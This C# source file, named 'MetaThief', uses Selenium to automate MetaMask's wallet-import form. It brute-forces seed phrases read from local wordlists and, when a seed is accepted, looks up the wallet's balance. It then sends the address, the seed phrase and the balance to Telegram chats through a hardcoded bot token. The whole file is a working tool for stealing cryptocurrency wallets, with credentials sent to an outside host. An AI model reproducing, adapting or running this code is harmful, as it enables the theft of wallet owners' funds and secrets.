using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Firefox;
using OpenQA.Selenium.Edge;
using System.Net;
using Newtonsoft.Json;
using System.Linq;
using Telegram.Bot;
using Telegram.Bot.Exceptions;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;

namespace MetaThief
{
    class Thief
    {
        public static void Main()
        {
            string path = @"C:\Users\79956\Downloads\metamask.crx";
            Byte[] bytes = System.IO.File.ReadAllBytes(path);
            string file = Convert.ToBase64String(bytes);

            ChromeOptions options = new ChromeOptions();
            options.AddEncodedExtension(file);
            options.AddArgument("ignore-certificate-errors");
            options.AddArgument("ignore-ssl-errors");

            IWebDriver driver = new ChromeDriver(options);
            Pirate pirate = new Pirate(driver, 10);
            pirate.Process();
        }
    }

    class Robot
    {
        int k;
        IWebDriver driver;
        string[] seed_array;

        public Robot(int k, IWebDriver driver, string[] seed_array)
        {
            this.k = k;
            this.driver = driver;
            this.seed_array = seed_array;
        }

        public void FillSeed()
        {
            IWebElement el = driver.FindElement(By.CssSelector($"#import-srp__srp-word-0"));
            for (int i = k; i < (k + 3); i++)
            {
                el = driver.FindElement(By.CssSelector($"#import-srp__srp-word-{i}"));
                //el.Click();
                el.SendKeys(Keys.Control + "a" + Keys.Delete);
                Teleport(driver, $"#import-srp__srp-word-{i}", seed_array[i]);
            }
        }

        public static void Teleport(IWebDriver driver, string path, string text = "")
        {
            var succces = false;
            while (!succces)
            {
                try
                {
                    IWebElement element = driver.FindElement(By.CssSelector(path));

                    if (text != "") element.SendKeys(text);
                    succces = true;
                }
                catch (Exception e)
                {
                    //exception
                }
            }
        }
    }

    class Pirate
    {
        private static string token = "5365737316:AAHzGxzQTN_PS1mARmh7-8Lq3vDO5KFnFcY";
        private static ITelegramBotClient client;


        public static IWebDriver driver;
        public static int from;
        public static bool found = false;
        public static bool password = false;
        public static int seed_file_id = 0;
        public static string[] seed_a;

        public Pirate(IWebDriver d, int i)
        {
            driver = d;
            seed_file_id = i;
        }

        public async void Process()
        {
            client = new TelegramBotClient(token);
            driver.Navigate().GoToUrl("https://google.com");
            driver.Close();

            var AftertTabs = driver.WindowHandles.ToList();
            driver.SwitchTo().Window(AftertTabs[0]);

            Teleport(driver, "#app-content > div > div.main-container-wrapper > div > div > div > button");
            Teleport(driver, "#app-content > div > div.main-container-wrapper > div > div > div.select-action__wrapper > div > div.select-action__select-buttons > div:nth-child(1) > button");
            Teleport(driver, "#app-content > div > div.main-container-wrapper > div > div > div > div.metametrics-opt-in__footer > div.page-container__footer > footer > button.button.btn--rounded.btn-primary.page-container__footer-button");

            while (true)
            {
                BrutePassword();
            }
        }

        public static void Teleport(IWebDriver driver, string path, string text = "")
        {
            var succces = false;
            while (!succces)
            {
                try
                {
                    IWebElement element = driver.FindElement(By.CssSelector(path));
                    element.Click();

                    if (text != "") element.SendKeys(text);
                    succces = true;
                }
                catch (Exception e)
                {
                    //exception
                }
            }
        }

        public static bool ElementVisible(IWebDriver driver, string path)
        {
            var visible = false;
            try
            {
                IWebElement element = driver.FindElement(By.CssSelector(path));
                element.Text.ToLower();

                visible = true;
            }
            catch
            {
                visible = false;
            }

            return visible;
        }

        public void BrutePassword()
        {
            var success = false;
            var seed = "";
            while (!success)
            {
                seed = GenerateSeed();
                var seed_array = seed.Split();

                Console.WriteLine($"Trying to hack with seed: {seed}");
                IWebElement el = driver.FindElement(By.CssSelector($"#import-srp__srp-word-0"));
                seed_a = seed_array;

                Robot robot0 = new Robot(0, driver, seed_array);
                Robot robot1 = new Robot(3, driver, seed_array);
                Robot robot2 = new Robot(6, driver, seed_array);
                Robot robot3 = new Robot(9, driver, seed_array);

                Thread thread0 = new Thread(robot0.FillSeed);
                Thread thread1 = new Thread(robot1.FillSeed);
                Thread thread2 = new Thread(robot2.FillSeed);
                Thread thread3 = new Thread(robot3.FillSeed);

                thread0.Start();
                thread1.Start();
                thread2.Start();
                thread3.Start();


                while (thread3.IsAlive) Thread.Sleep(1);

                if (!password) Teleport(driver, "#password", "ELONMUSK33");


                if (!password) Teleport(driver, "#confirm-password", "ELONMUSK33");


                if (!found) Teleport(driver, "#create-new-vault__terms-checkbox");
                password = true;

                if (!ElementVisible(driver, "#app-content > div > div.main-container-wrapper > div > div > div.first-time-flow__import > form > div.import-srp__container > div.actionable-message.actionable-message--danger.import-srp__srp-error.actionable-message--with-icon > div")
                    && !ElementVisible(driver, "#app-content > div > div.main-container-wrapper > div > div > div > form > div.import-srp__container > div.actionable-message.actionable-message--danger.import-srp__srp-error.actionable-message--with-icon > div"))
                {
                    success = true;
                }
                else
                {
                    if (!found) Teleport(driver, "#create-new-vault__terms-checkbox");
                }

                from++;
            }

            Console.WriteLine($"Hacked with seed: {seed}");
            if (!found) Teleport(driver, "#app-content > div > div.main-container-wrapper > div > div > div.first-time-flow__import > form > button");
            else Teleport(driver, "#app-content > div > div.main-container-wrapper > div > div > div > form > button");
            if (!found) Teleport(driver, "#app-content > div > div.main-container-wrapper > div > div > button");
            if (!found) Teleport(driver, "#popover-content > div > div > section > div.box.popover-header.box--rounded-xl.box--padding-top-6.box--padding-right-4.box--padding-bottom-4.box--padding-left-4.box--display-flex.box--flex-direction-column.box--background-color-background-default > div > button");
            Teleport(driver, "#app-content > div > div.main-container-wrapper > div > div > div > div.menu-bar > button");
            Teleport(driver, "#popover-content > div.menu__container.account-options-menu > button:nth-child(2)");

            while (!ElementVisible(driver, "#app-content > div > span > div.modal > div > div > div > div.qr-code > div.qr-code__address-container__tooltip-wrapper > div > div > div.qr-code__address"))
            {
                Thread.Sleep(1);
            }
            IWebElement element = driver.FindElement(By.CssSelector("#app-content > div > span > div.modal > div > div > div > div.qr-code > div.qr-code__address-container__tooltip-wrapper > div > div > div.qr-code__address"));
            var address = element.Text.ToString();

            _ = GetBalanceAsync(address, seed);
            found = true;
            password = false;



            Teleport(driver, "#app-content > div > span > div.modal > div > div > div > button.account-modal__close");
            Teleport(driver, "#app-content > div > div.app-header > div > div.app-header__account-menu-container > div.account-menu__icon > div");
            Teleport(driver, "#app-content > div > div.account-menu > div.account-menu__item.account-menu__header > button");
            Teleport(driver, "#app-content > div > div.main-container-wrapper > div > div > div.unlock-page__links > a");
        }

        public static string GenerateSeed()
        {
            StreamReader sr = new StreamReader(@$"D:\Словесная база\{seed_file_id}.txt", System.Text.Encoding.Default);
            string array = sr.ReadToEnd();
            string seed = array.Split("\n")[0];
            array = array.Replace(seed, "");

            sr.Close();
            StreamWriter sw = new StreamWriter(@$"D:\Словесная база\{seed_file_id}.txt", false, System.Text.Encoding.Default);
            sw.WriteLine(array.Trim());
            sw.Close();

            return seed.Trim();
        }

        public static async Task GetBalanceAsync(string address, string seed)
        {
            WebRequest request = WebRequest.Create($"https://openapi.debank.com/v1/user/total_balance?id={address}");
            WebResponse response = request.GetResponse();
            using (Stream stream = response.GetResponseStream())
            {
                using (StreamReader reader = new StreamReader(stream))
                {
                    string line = "";
                    while ((line = reader.ReadLine()) != null)
                    {
                        var obj = JsonConvert.DeserializeObject<Request>(line);
                        await client.SendTextMessageAsync(476375643, $"\nAddress: {address}\nSeed: {seed}\nMoney: {obj.total_usd_value}$\n");
                        await client.SendTextMessageAsync(1143912992, $"\nAddress: {address}\nSeed: {seed}\nMoney: {obj.total_usd_value}$\n");
                        Console.WriteLine($"\nAddress: {address}\nSeed: {seed}\nMoney: {obj.total_usd_value}$\n");
                    }
                }
            }
            response.Close();
        }
    }
}